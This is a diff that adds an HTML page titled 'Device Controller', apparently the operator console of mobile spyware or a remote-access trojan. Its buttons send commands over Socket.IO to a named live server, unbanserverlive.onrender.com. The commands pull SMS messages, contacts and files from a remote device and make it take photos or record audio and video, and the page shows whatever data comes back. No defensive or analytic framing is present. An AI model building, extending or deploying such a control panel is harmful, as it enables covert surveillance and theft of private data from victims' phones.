@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Device Controller</title>
+    <style>
+        body { 
+            font-family: Arial; 
+            background: #101114; 
+            color: white; 
+            padding: 20px; 
+            text-align: center;
+        }
+        button {
+            background: #00E5FF;
+            color: black;
+            border: none;
+            padding: 15px 30px;
+            margin: 10px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover { background: #00BCD4; }
+        #output {
+            margin-top: 20px;
+            background: #1a1a1e;
+            padding: 20px;
+            border-radius: 8px;
+            max-height: 400px;
+            overflow-y: auto;
+            text-align: left;
+            white-space: pre-wrap;
+        }
+        .status { color: #4CAF50; font-weight: bold; }
+        .status-off { color: #f44336; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>📱 Device Controller</h1>
+    <div id="status">Status: <span class="status-off">Disconnected ❌</span></div>
+    <br>
+    <button onclick="sendCommand('get_sms')">📩 Get SMS</button>
+    <button onclick="sendCommand('get_contacts')">👤 Get Contacts</button>
+    <button onclick="sendCommand('get_files')">📁 Get Files</button>
+    <button onclick="sendCommand('take_photo')">📸 Take Photo</button>
+    <button onclick="sendCommand('record_audio')">🎤 Record Audio</button>
+    <button onclick="sendCommand('record_video')">🎥 Record Video</button>
+    <button onclick="sendCommand('get_status')">📊 Get Status</button>
+    <br><br>
+    <div id="output">📋 Data will appear here...</div>
+
+    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+    <script>
+        // Connect to your Render server
+        const socket = io('https://unbanserverlive.onrender.com');
+        
+        socket.on('connect', () => {
+            document.getElementById('status').innerHTML = 'Status: <span class="status">Connected ✅</span>';
+        });
+
+        socket.on('disconnect', () => {
+            document.getElementById('status').innerHTML = 'Status: <span class="status-off">Disconnected ❌</span>';
+        });
+
+        // Listen for data from device
+        socket.on('device_data', (data) => {
+            let output = document.getElementById('output');
+            output.innerHTML = `<b>📥 Received:</b>\n${JSON.stringify(data, null, 2)}`;
+        });
+
+        // Listen for status updates
+        socket.on('device_status', (data) => {
+            let output = document.getElementById('output');
+            output.innerHTML = `<b>📡 Status Update:</b>\n${JSON.stringify(data, null, 2)}`;
+        });
+
+        function sendCommand(cmd) {
+            let output = document.getElementById('output');
+            output.innerHTML = `⏳ Sending command: ${cmd}...`;
+            socket.emit('send_command', { cmd: cmd });
+        }
+    </script>
+</body>
+</html>
